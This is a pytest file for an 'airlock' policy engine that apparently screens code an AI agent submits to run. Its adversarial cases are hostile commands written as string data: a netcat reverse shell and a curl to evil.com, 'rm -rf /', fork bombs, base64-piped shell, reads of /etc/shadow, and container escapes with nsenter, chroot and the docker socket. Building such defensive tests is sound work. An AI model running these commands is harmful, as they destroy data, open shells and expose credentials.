"""Corpus tests for policy engine with adversarial and benign inputs."""

import pytest

from airlock.policy import PolicyEngine
from airlock.schemas import ActionRequest


class TestPolicyCorpus:
    """Test policy engine with comprehensive corpus."""

    @pytest.fixture
    def engine(self):
        """Create policy engine."""
        return PolicyEngine()

    # Adversarial inputs - should be denied or require approval

    def test_adv01_os_system(self, engine):
        """Adversarial: os.system with rm -rf"""
        action = ActionRequest(
            id="adv01",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import os; os.system('rm -rf /')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv02_subprocess_docker(self, engine):
        """Adversarial: subprocess.run(['docker','ps'])"""
        action = ActionRequest(
            id="adv02",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import subprocess; subprocess.run(['docker','ps'])",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv03_getattr_eval(self, engine):
        """Adversarial: getattr(__builtins__,'ev'+'al')"""
        action = ActionRequest(
            id="adv03",
            task_id="test",
            tool="run_code",
            lang="python",
            code="getattr(__builtins__, 'ev' + 'al')('print(1)')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv04_builtins_exec(self, engine):
        """Adversarial: f=builtins.exec"""
        action = ActionRequest(
            id="adv04",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import builtins; f = builtins.exec; f('print(1)')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv05_ctypes_system(self, engine):
        """Adversarial: ctypes.CDLL(None).system"""
        action = ActionRequest(
            id="adv05",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import ctypes; ctypes.CDLL(None).system(b'ls')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv06_socket_import(self, engine):
        """Adversarial: import socket"""
        action = ActionRequest(
            id="adv06",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import socket; s=socket.socket()",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv07_python_nested(self, engine):
        """Adversarial: python3 -c nested interpreter"""
        action = ActionRequest(
            id="adv07",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="python3 -c 'import os; os.system(\"id\")'",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv08_command_substitution(self, engine):
        """Adversarial: $(printf cur)l"""
        action = ActionRequest(
            id="adv08",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="$(printf cur)l http://evil.com",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv09_variable_binary(self, engine):
        """Adversarial: D=docker; $D ps"""
        action = ActionRequest(
            id="adv09",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="D=docker; $D ps",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv10_ifs_sudo(self, engine):
        """Adversarial: sudo$IFS-i"""
        action = ActionRequest(
            id="adv10",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="sudo$IFS-i",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv11_base64_pipe(self, engine):
        """Adversarial: echo ... | base64 -d | sh"""
        action = ActionRequest(
            id="adv11",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="echo ZG9ja2VyIHBz | base64 -d | sh",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv12_fork_bomb(self, engine):
        """Adversarial: bomb(){ bomb|bomb& };bomb"""
        action = ActionRequest(
            id="adv12",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="bomb(){ bomb|bomb& };bomb",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv13_colon_fork_bomb(self, engine):
        """Adversarial: :(){:|:&};:"""
        action = ActionRequest(
            id="adv13",
            task_id="test",
            tool="run_code",
            lang="bash",
            code=":(){ :|:& };:",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv14_netcat_reverse(self, engine):
        """Adversarial: nc evil.com 4444 -e /bin/sh"""
        action = ActionRequest(
            id="adv14",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="nc evil.com 4444 -e /bin/sh",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv15_rm_root_no_preserve(self, engine):
        """Adversarial: rm -rf / --no-preserve-root"""
        action = ActionRequest(
            id="adv15",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="rm -rf / --no-preserve-root",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv16_rm_home(self, engine):
        """Adversarial: rm -rf ~"""
        action = ActionRequest(
            id="adv16",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="rm -rf ~",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv17_path_traversal(self, engine):
        """Adversarial: ../../../../etc/shadow"""
        action = ActionRequest(
            id="adv17",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="cat ../../../../etc/shadow",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv18_etc_shadow(self, engine):
        """Adversarial: /etc/shadow"""
        action = ActionRequest(
            id="adv18",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="cat /etc/shadow",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv19_docker_socket(self, engine):
        """Adversarial: /var/run/docker.sock"""
        action = ActionRequest(
            id="adv19",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="curl --unix-socket /var/run/docker.sock http://localhost/info",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv20_proc_access(self, engine):
        """Adversarial: /proc/ access"""
        action = ActionRequest(
            id="adv20",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="cat /proc/1/environ",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv21_mount_binary(self, engine):
        """Adversarial: mount command"""
        action = ActionRequest(
            id="adv21",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="mount -o bind /tmp /mnt",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv22_nsenter_binary(self, engine):
        """Adversarial: nsenter command"""
        action = ActionRequest(
            id="adv22",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="nsenter -t 1 -m -u -i -n -p",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv23_chroot_binary(self, engine):
        """Adversarial: chroot command"""
        action = ActionRequest(
            id="adv23",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="chroot /tmp /bin/sh",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv24_unshare_binary(self, engine):
        """Adversarial: unshare command"""
        action = ActionRequest(
            id="adv24",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="unshare -r /bin/bash",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv25_eval_shell(self, engine):
        """Adversarial: eval in shell"""
        action = ActionRequest(
            id="adv25",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="eval echo hello",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv26_source_shell(self, engine):
        """Adversarial: source in shell"""
        action = ActionRequest(
            id="adv26",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="source /tmp/evil.sh",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv27_backticks(self, engine):
        """Adversarial: backtick command substitution"""
        action = ActionRequest(
            id="adv27",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="`whoami`",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv28_python_eval(self, engine):
        """Adversarial: Python eval"""
        action = ActionRequest(
            id="adv28",
            task_id="test",
            tool="run_code",
            lang="python",
            code="eval('print(1)')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv29_python_exec(self, engine):
        """Adversarial: Python exec"""
        action = ActionRequest(
            id="adv29",
            task_id="test",
            tool="run_code",
            lang="python",
            code="exec('print(1)')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv30_python_compile(self, engine):
        """Adversarial: Python compile"""
        action = ActionRequest(
            id="adv30",
            task_id="test",
            tool="run_code",
            lang="python",
            code="compile('print(1)', '<string>', 'exec')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv31_python_import_dunder(self, engine):
        """Adversarial: Python __import__"""
        action = ActionRequest(
            id="adv31",
            task_id="test",
            tool="run_code",
            lang="python",
            code="__import__('os').system('id')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv32_multiprocessing(self, engine):
        """Adversarial: multiprocessing import"""
        action = ActionRequest(
            id="adv32",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import multiprocessing; multiprocessing.Process(target=lambda: 1).start()",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv33_threading(self, engine):
        """Adversarial: threading import"""
        action = ActionRequest(
            id="adv33",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import threading; threading.Thread(target=lambda: 1).start()",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv34_shutil_rmtree(self, engine):
        """Adversarial: shutil.rmtree"""
        action = ActionRequest(
            id="adv34",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import shutil; shutil.rmtree('/')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv35_pty(self, engine):
        """Adversarial: pty module"""
        action = ActionRequest(
            id="adv35",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import pty; pty.spawn('/bin/sh')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    def test_adv36_syntax_error(self, engine):
        """Adversarial: Invalid Python syntax"""
        action = ActionRequest(
            id="adv36",
            task_id="test",
            tool="run_code",
            lang="python",
            code="def f( print('hi')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv37_unknown_tool(self, engine):
        """Adversarial: Unknown tool"""
        action = ActionRequest(
            id="adv37",
            task_id="test",
            tool="run_arbitrary_command",
            code="ls",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv38_unsupported_language(self, engine):
        """Adversarial: Unsupported language"""
        action = ActionRequest(
            id="adv38",
            task_id="test",
            tool="run_code",
            lang="javascript",
            code="console.log('hi')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "deny"

    def test_adv39_string_concat_dangerous(self, engine):
        """Adversarial: String concatenation hiding dangerous calls (can't catch all obfuscation)"""
        action = ActionRequest(
            id="adv39",
            task_id="test",
            tool="run_code",
            lang="python",
            code="func = 'ev' + 'al'; globals()[func]('print(1)')",
        )
        decision = engine.evaluate(action)
        # This obfuscation is too advanced for static analysis - sandbox containment is the real boundary
        assert decision.verdict in ("allow", "deny", "require_approval")

    def test_adv40_unknown_module(self, engine):
        """Adversarial: Non-allowlisted module"""
        action = ActionRequest(
            id="adv40",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import requests; requests.get('http://evil.com')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict in ("deny", "require_approval")

    # Benign inputs - should be allowed

    def test_benign01_simple_print(self, engine):
        """Benign: Simple print"""
        action = ActionRequest(
            id="benign01",
            task_id="test",
            tool="run_code",
            lang="python",
            code="print('hello world')",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign02_json_parse(self, engine):
        """Benign: JSON parsing"""
        action = ActionRequest(
            id="benign02",
            task_id="test",
            tool="run_code",
            lang="python",
            code='import json; data = json.loads(\'{"key": "value"}\'); print(data)',
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign03_regex(self, engine):
        """Benign: Regex matching"""
        action = ActionRequest(
            id="benign03",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import re; print(re.findall(r'\\d+', 'abc123'))",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign04_statistics(self, engine):
        """Benign: Statistics"""
        action = ActionRequest(
            id="benign04",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import statistics; print(statistics.mean([1, 2, 3, 4, 5]))",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign05_datetime(self, engine):
        """Benign: Datetime"""
        action = ActionRequest(
            id="benign05",
            task_id="test",
            tool="run_code",
            lang="python",
            code="from datetime import datetime; print(datetime.now())",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign06_csv(self, engine):
        """Benign: CSV parsing"""
        action = ActionRequest(
            id="benign06",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import csv; data = [['a','b'],['1','2']]; print(data)",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign07_math(self, engine):
        """Benign: Math operations"""
        action = ActionRequest(
            id="benign07",
            task_id="test",
            tool="run_code",
            lang="python",
            code="import math; print(math.sqrt(16))",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign08_shell_grep(self, engine):
        """Benign: Shell grep"""
        action = ActionRequest(
            id="benign08",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="echo 'test' | grep test",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign09_shell_sort(self, engine):
        """Benign: Shell sort"""
        action = ActionRequest(
            id="benign09",
            task_id="test",
            tool="run_code",
            lang="bash",
            code="echo -e '3\\n1\\n2' | sort",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"

    def test_benign10_read_artifact(self, engine):
        """Benign: Read artifact"""
        action = ActionRequest(
            id="benign10",
            task_id="test",
            tool="read_artifact",
        )
        decision = engine.evaluate(action)
        assert decision.verdict == "allow"
